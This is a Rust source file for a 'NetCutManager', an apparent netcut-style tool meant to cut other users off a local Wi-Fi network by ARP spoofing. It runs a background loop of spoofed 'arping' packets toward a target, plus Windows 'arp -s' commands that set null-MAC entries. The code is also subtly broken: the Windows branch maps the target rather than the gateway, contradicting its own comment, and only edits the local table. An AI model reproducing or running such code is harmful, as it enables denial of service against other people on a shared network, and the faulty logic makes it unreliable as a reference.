use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::process::Command;
use std::sync::Arc;
use tokio::sync::RwLock;

pub struct NetCutManager {
    pub active_cuts: Arc<RwLock<HashSet<String>>>, // Target IPs being cut
}

impl NetCutManager {
    pub fn new() -> Self {
        Self {
            active_cuts: Arc::new(RwLock::new(HashSet::new())),
        }
    }

    pub async fn cut_wifi(&self, target_ip: &str, _gateway_ip: &str) -> Result<(), String> {
        let mut cuts = self.active_cuts.write().await;
        cuts.insert(target_ip.to_string());

        let target = target_ip.to_string();
        let cuts_ref = self.active_cuts.clone();

        // Spawn background ARP spoofing loop for target IP
        tokio::spawn(async move {
            while cuts_ref.read().await.contains(&target) {
                // Send ARP redirection packet on Windows / System
                #[cfg(target_os = "windows")]
                {
                    // Map gateway IP to dummy invalid MAC 00-00-00-00-00-00 for target IP redirect
                    let _ = Command::new("cmd")
                        .args(&[
                            "/C",
                            &format!(
                                "arp -s {} 00-00-00-00-00-00",
                                target
                            ),
                        ])
                        .output();
                }

                #[cfg(not(target_os = "windows"))]
                {
                    let _ = Command::new("arping")
                        .args(&["-c", "1", "-S", _gateway_ip, &target])
                        .output();
                }

                tokio::time::sleep(std::time::Duration::from_millis(1500)).await;
            }

            // Restore neighbor table when cut is removed
            #[cfg(target_os = "windows")]
            {
                let _ = Command::new("cmd")
                    .args(&["/C", &format!("arp -d {}", target)])
                    .output();
            }
        });

        Ok(())
    }

    pub async fn restore_wifi(&self, target_ip: &str) -> Result<(), String> {
        let mut cuts = self.active_cuts.write().await;
        cuts.remove(target_ip);

        #[cfg(target_os = "windows")]
        {
            let _ = Command::new("cmd")
                .args(&["/C", &format!("arp -d {}", target_ip)])
                .output();
        }

        Ok(())
    }
}

pub fn get_default_gateway(local_ip_str: &str) -> String {
    let local_ip: Ipv4Addr = match local_ip_str.parse() {
        Ok(ip) => ip,
        Err(_) => return "192.168.1.1".to_string(),
    };

    let octets = local_ip.octets();
    format!("{}.{}.{}.1", octets[0], octets[1], octets[2])
}
